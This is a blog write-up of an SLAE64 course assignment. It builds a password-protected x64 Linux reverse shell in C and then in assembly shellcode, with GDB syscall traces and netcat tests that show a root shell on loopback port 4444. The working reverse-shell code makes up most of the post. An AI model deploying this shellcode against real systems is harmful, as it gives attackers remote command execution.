---
title: SLAE64 Assignment 2 - Password Protected Reverse Shell
date: 2020-4-06
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE64.png
tags:
  - Reverse
  - Shell
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE64.png)


# C Reverse Shell 
I first created a skelton reverse shell using the C language to reverse engineer the work needed to be done for the assembly shellcode version.

## revshell.c
```c
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */
#include <stdlib.h>
int main(void)
{
	int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	struct sockaddr_in ipSocketAddr = { 
        .sin_family = AF_INET, 
        .sin_port = htons(4444), 
        .sin_addr.s_addr = inet_addr("127.1.1.1") 
    };
	connect(ipv4Socket, (struct sockaddr*)&ipSocketAddr, sizeof(ipSocketAddr)); 
	dup2(ipv4Socket, 0); // Standard Input
	dup2(ipv4Socket, 1); // Standard Output
	dup2(ipv4Socket, 2); // Standard Error
    write(ipv4Socket, "Mothers Maiden Name?", 20); 
    char buff[4];
    read(ipv4Socket, buff, 4);
	execve("/bin/bash", NULL, NULL);
}	
```
+ Password checking will be done in assembly and is not included in the C skeleton program.

## Compiling & Testing
```bash
root# gcc revshell.c -o revshell
root# ./revshell 
────────────────────────────────────────────────────────────
root# nc -nlvp 4444
listening on [any] 4444 ...
connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 44006
Mothers Maiden Name?1337
id
uid=0(root) gid=0(root) groups=0(root),46(plugdev)
```

## C Reverse Shell GDB Analysis
```bash
root# gdb ./revshell
db-peda$ info functions
0x0000000000001030  write@plt
0x0000000000001040  htons@plt
0x0000000000001050  dup2@plt
0x0000000000001060  read@plt
0x0000000000001070  execve@plt
0x0000000000001080  inet_addr@plt
0x0000000000001090  connect@plt
0x00000000000010a0  socket@plt
gdb-peda$ b socket
Breakpoint 1 at 0x10a0
gdb-peda$ r
```

### 1 - Socket
```bash
[----------------------code----------------------]
=> 0x7ffff7edf8d0 <socket>:     mov    eax,0x29
   0x7ffff7edf8d5 <socket+5>:   syscall
[-------- Registers at time System Call ---------]
RAX: 0x29
RDI: 0x2 
RSI: 0x1 
RDX: 0x0 
```

### 2 - Connect
```bash
[-------- Registers at time System Call ---------]
RAX: 0x2a
RDI: 0x3 <- Socket FD returned from socket()
RSI: 0x7fffffffe120 --> 0x101017f5c110002
  gdb-peda$ hexdump $rsi 16
  0x00007fffffffe120 : 
    02 00 11 5c 7f 01 01 01 00 00 00 00 00 00 00 00
  AF_INET|4444 |127.1. 1. 1 [----Leave as Nulls----]
RDX: 0x10 <- Struct Size (16 bytes)
```

### 3 - Dup2
```bash
[----------------------code----------------------]
=> 0x7ffff7ed0020 <dup2>:       mov    eax,0x21
   0x7ffff7ed0025 <dup2+5>:     syscall 
[-------- Registers at time System Call ---------]
RAX: 0x21
RDI:  0x3 <- Socket FD returned from socket()
RSI: 0x0, 0x1, 0x2
```

### 4 - Write
```bash
[-------- Registers at time System Call ---------]
RAX: 0x1
RDI: 0x3 <- Socket FD returned from socket()
RSI: 0x55555555600e ("Mothers Maiden Name?")
RDX: 0x14 <- Size of String (20 bytes)
```

### 5 - Read
```bash
[-------- Registers at time System Call ---------]
RAX: 0x0
RDI: 0x3 <- Socket FD returned from socket()
RSI: &Destination
RDX: 0x4 <- Size of String to read
```

### 6 - Execve
```bash
[----------------------code----------------------]
=> 0x7ffff7eabe80 <execve>:     mov    eax,0x3b
   0x7ffff7eabe85 <execve+5>:   syscall 
[-------- Registers at time System Call ---------]
RAX: 0x3b
RDI: 0x555555556023 ("/bin/bash")
  gdb-peda$ hexdump $rdi
  0x0000555555556023 : 2f 62 69 6e 2f 62 61 73 68 00  /bin/bash.
RSI: 0x0
RDX: 0x0
```

### Sys Calls
```bash
root# cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | \
egrep "(connect|execve |write |read |socket |dup2)"
#define __NR_read 0       => \x00
#define __NR_write 1      => \x01
#define __NR_dup2 33      => \x21
#define __NR_socket 41    => \x29
#define __NR_connect 42   => \x2a
#define __NR_execve 59    => \x3b
```


# Assembly
```asm
global _start

section .text

_start:
; int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
; rax = 0x29
; rdi = 0x2  = AF_INET
; rsi = 0x1  = SOCK_STREAM
; rdx = 0x0  = IPPROTO_IP

xor rsi, rsi   ; clear rsi
mul rsi        ; clear rax, rdx ; rdx = 0x0 = IPPROTO_IP
add al, 0x29   ; rax = 0x29 = socket syscall
inc rsi        ; rsi = 0x1 = SOCK_STREAM
push rsi
pop rdi        ; rdi = 0x1
inc rdi        ; rdi = 0x2 = AF_INET
syscall        ; socket syscall ; RAX returns socket File-Descriptor


; connect(ipv4Socket, (struct sockaddr*)&ipSocketAddr, sizeof(ipSocketAddr));  
; RAX: 0x2a
; RDI: 0x3     <- Socket FD returned from socket()
; RSI: 0x7fffffffe120 --> 0x101017f5c110002
;   gdb-peda$ hexdump $rsi 16
;   0x00007fffffffe120 :
;     02 00 11 5c 7f 01 01 01 00 00 00 00 00 00 00 00
;   AF_INET|4444 |127.1. 1. 1 [----Leave as Nulls----]
; RDX: 0x10    <- Struct Size (16 bytes)

xchg rdi, rax    ; RDI = sockfd / ipv4Socket
xor rax, rax
add al, 0x2a     ; rax = 0x2a = connect syscall
push rdx         ; 8 bytes of zeros for second half of struct
push dword 0x0101017f
push word 0x5c11 ; push 2 bytes for TCP Port 4444
inc rdx
inc rdx          
push dx          ; dx = 0x0002 = AF_INET
add dl, 0xe      ; rdi = 0x10 = sizeof(ipSocketAddr)
mov rsi, rsp     ; rsi = &ipSocketAddr
syscall

; dup2
xor rsi, rsi
xor edx, edx
add dl, 0x3      ; Loop Counter

dup2Loop:
xor rax, rax
add al, 0x21     ; RAX = 0x21 = dup2 systemcall
syscall          ; call dup2 x3 to redirect STDIN STDOUT STDERR
inc rsi
cmp rsi, rdx     ; if 2-STDERR, end loop
jne dup2Loop

password:
; write
; rax = 0x1
; rdi = fd = 0x1 STDOUT
; rsi = &String
; rdx = sizeof(String)
;   "Mothers Maiden Name?"
;String length : 20
;      ?ema : 3f656d61
;  N nediaM : 4e206e656469614d
;   srehtoM : 2073726568746f4d

xor rdi, rdi
mul rdi
push rdi
pop rsi
push rsi
push dword 0x3f656d61
mov rsi, 0x4e206e656469614d
push rsi
mov rsi, 0x2073726568746f4d
push rsi
mov rsi, rsp    ; rsi = &String
inc rax         ; rax = 0x1 = write system call
mov rdi, rax
add rdx, 0x14   ; 20 bytes / size of string
syscall

; read
; rax = 0x0 = read systemcall
; rdi = fd = 0x0 STDIN
; rsi = Write to &String
; rdx = 0x4 = sizeof(String)
xor rdi, rdi
push rdi
mul rdi         ; rdx =0x0 ; rax = 0x0 = write system call
mov rsi, rsp    ; rsi = [RSP] = &String
add rdx, 0x4    ; 4 bytes / size of password
syscall

; "1337"
; String length : 4
;   7331 : 37333331
mov rdi, rsp
push 0x37333331
mov rsi, rsp    ; rsi = &String
xor rcx, rcx
add rcx, 0x4
repe cmpsb
jnz password

;execve
; rax = 0x3b
; rdi = Pointer -> "/bin/bash"0x00
;root# python reverse.py "/bin/bash"
;String length : 9
;h : 68
;sab/nib/ : 7361622f6e69622f
; rsi = 0x0
; rdx = 0x0

xor rsi, rsi
mul rsi          ; rdx&rax= 0x0
xor rdi, rdi
push rdi
add rdx, 0x68
push rdx
mov rdx, 0x7361622f6e69622f ; "/bin/bas"
push rdx
xor rdx, rdx
mov rdi, rsp
mov al, 0x3b  
syscall  ; call execve("/bin/bash", NULL, NULL)
```

## Testing
#### Terminal 1
```bash
root# nasm -f elf64 revshell.asm -o revshell.o
root# ld revshell.o -o revshell
root# ./revshell
```

## Testing
#### Terminal 2
```bash
root@zed# nc -nlvp 4444
listening on [any] 4444 ...
connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 44400
Mothers Maiden Name?asd
Mothers Maiden Name?123
Mothers Maiden Name?1337
id
uid=0(root) gid=0(root) groups=0(root),46(plugdev)
```
